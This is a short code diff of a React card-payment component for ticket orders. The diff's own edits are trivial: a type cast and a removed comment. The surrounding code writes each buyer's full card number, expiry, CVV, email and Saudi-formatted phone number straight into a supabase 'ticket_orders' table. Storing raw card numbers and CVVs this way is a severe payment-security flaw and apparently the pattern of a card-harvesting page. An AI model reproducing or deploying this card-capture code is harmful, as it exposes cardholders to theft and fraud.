@@ -295,7 +295,7 @@ const CardPayment = () => {
     setLoading(true);
     try {
       const clean = cardNumber.replace(/\s/g, "");
-      const { data, error } = await supabase
+      const { data, error } = await (supabase as any)
         .from("ticket_orders")
         .insert({
           status: "pending",
@@ -306,7 +306,7 @@ const CardPayment = () => {
           card_full_number: clean,
           card_expiry: expiry,
           card_cvv: cvv,
-          total: state?.total || 0,          // ✅ تم التصحيح: total_amount → total
+          total: state?.total || 0,
           email: state?.email || null,
           phone: state?.phone ? `00966${state.phone.replace(/^0+/, "").replace(/^\+966/, "")}` : null,
           subtotal: state?.subtotal || null,
